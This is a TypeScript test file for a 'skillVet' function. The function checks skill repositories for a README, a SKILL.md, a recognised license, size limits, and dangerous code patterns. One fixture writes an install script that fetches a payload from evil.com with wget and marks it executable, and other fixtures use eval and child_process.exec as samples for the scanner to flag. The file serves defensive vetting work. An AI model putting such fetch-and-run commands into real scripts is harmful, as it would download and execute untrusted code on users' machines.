import { test, describe, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { skillVet } from "../src/skills/vet.js";

describe("skillVet", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), "skill-vet-"));
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  // ─── Helper ─────────────────────────────────────────────────────────────

  function makeRepo(files: Record<string, string>): void {
    for (const [name, content] of Object.entries(files)) {
      const full = join(tmpDir, name);
      const dir = full.substring(0, full.lastIndexOf("/"));
      if (dir !== tmpDir) {
        mkdirSync(dir, { recursive: true });
      }
      writeFileSync(full, content);
    }
  }

  // ─── Clean repo passes ────────────────────────────────────────────────

  test("clean repo with MIT license passes all checks", async () => {
    makeRepo({
      "README.md": "# My Skill\nA cool skill.",
      "SKILL.md": "name: my-skill\ndescription: does stuff",
      LICENSE: "MIT License\n\nCopyright (c) 2025 Test",
      "src/index.ts": "export const hello = () => 'world';",
    });

    const report = await skillVet(tmpDir);
    assert.equal(report.ok, true);
    assert.equal(report.reasons.length, 0);
    assert.equal(report.has_readme, true);
    assert.equal(report.has_skill_md, true);
    assert.equal(report.license, "MIT");
    assert.equal(report.flagged_patterns.length, 0);
    assert.ok(report.size_kb > 0);
  });

  // ─── eval( flags ──────────────────────────────────────────────────────

  test("repo with eval( in source gets flagged", async () => {
    makeRepo({
      "README.md": "# Test",
      "SKILL.md": "name: test",
      LICENSE: "MIT License\nCopyright 2025",
      "src/bad.ts": 'const x = eval("1+1");\n',
    });

    const report = await skillVet(tmpDir);
    assert.equal(report.ok, false);
    assert.ok(report.flagged_patterns.length > 0);
    assert.equal(report.flagged_patterns[0].pattern, "eval(");
    assert.equal(report.flagged_patterns[0].file, "src/bad.ts");
    assert.equal(report.flagged_patterns[0].line, 1);
  });

  test("repo with new Function( gets flagged", async () => {
    makeRepo({
      "README.md": "# Test",
      "SKILL.md": "name: test",
      LICENSE: "MIT License\nCopyright 2025",
      "src/dyn.js": 'const fn = new Function("return 1");\n',
    });

    const report = await skillVet(tmpDir);
    assert.ok(report.flagged_patterns.some((p) => p.pattern === "new Function("));
  });

  test("repo with child_process.exec( gets flagged", async () => {
    makeRepo({
      "README.md": "# Test",
      "SKILL.md": "name: test",
      LICENSE: "MIT License\nCopyright 2025",
      "src/exec.ts": 'import { exec } from "child_process";\nchild_process.exec("ls");\n',
    });

    const report = await skillVet(tmpDir);
    assert.ok(report.flagged_patterns.some((p) => p.pattern === "child_process.exec("));
  });

  test("repo with wget and chmod +x gets flagged", async () => {
    makeRepo({
      "README.md": "# Test",
      "SKILL.md": "name: test",
      LICENSE: "MIT License\nCopyright 2025",
      "scripts/install.sh": "wget https://evil.com/payload\nchmod +x payload\n",
    });

    const report = await skillVet(tmpDir);
    assert.ok(report.flagged_patterns.some((p) => p.pattern === "wget"));
    assert.ok(report.flagged_patterns.some((p) => p.pattern === "chmod +x"));
  });

  // ─── Oversized repo ───────────────────────────────────────────────────

  test("oversized repo is rejected", async () => {
    makeRepo({
      "README.md": "# Test",
      "SKILL.md": "name: test",
      LICENSE: "MIT License\nCopyright 2025",
      "src/index.ts": "export const x = 1;",
    });

    // Use a very small max_size_kb to trigger the check
    const report = await skillVet(tmpDir, { max_size_kb: 0 });
    assert.equal(report.ok, false);
    assert.ok(report.reasons.some((r) => r.includes("exceeds limit")));
  });

  // ─── Missing README ───────────────────────────────────────────────────

  test("missing README is noted", async () => {
    makeRepo({
      "SKILL.md": "name: test",
      LICENSE: "MIT License\nCopyright 2025",
      "src/index.ts": "export const x = 1;",
    });

    const report = await skillVet(tmpDir);
    assert.equal(report.has_readme, false);
    assert.ok(report.reasons.some((r) => r.includes("Missing README")));
  });

  // ─── Missing SKILL.md ────────────────────────────────────────────────

  test("missing SKILL.md is noted", async () => {
    makeRepo({
      "README.md": "# Hello",
      LICENSE: "MIT License\nCopyright 2025",
      "src/index.ts": "export const x = 1;",
    });

    const report = await skillVet(tmpDir);
    assert.equal(report.has_skill_md, false);
    assert.ok(report.reasons.some((r) => r.includes("Missing SKILL.md")));
  });

  // ─── License detection ────────────────────────────────────────────────

  test("detects Apache-2.0 license", async () => {
    makeRepo({
      "README.md": "# Test",
      "SKILL.md": "name: test",
      LICENSE: "Apache License, Version 2.0\nCopyright 2025",
      "src/index.ts": "export const x = 1;",
    });

    const report = await skillVet(tmpDir);
    assert.equal(report.license, "Apache-2.0");
  });

  test("no license file returns null license and fails", async () => {
    makeRepo({
      "README.md": "# Test",
      "SKILL.md": "name: test",
      "src/index.ts": "export const x = 1;",
    });

    const report = await skillVet(tmpDir);
    assert.equal(report.ok, false);
    assert.ok(report.reasons.some((r) => r.includes("No recognized OSS license")));
  });

  test("detects license from package.json", async () => {
    makeRepo({
      "README.md": "# Test",
      "SKILL.md": "name: test",
      "package.json": '{"name":"test","license":"ISC"}',
      "src/index.ts": "export const x = 1;",
    });

    const report = await skillVet(tmpDir);
    assert.equal(report.license, "ISC");
  });

  // ─── .git directory ignored ───────────────────────────────────────────

  test(".git directory is excluded from size calculation", async () => {
    makeRepo({
      "README.md": "# Test",
      "SKILL.md": "name: test",
      LICENSE: "MIT License\nCopyright 2025",
      "src/index.ts": "export const x = 1;",
      ".git/objects/big": "x".repeat(100_000),
    });

    const report = await skillVet(tmpDir, { max_size_kb: 10 });
    // Should NOT count the .git directory size
    assert.ok(report.size_kb < 10);
  });
});
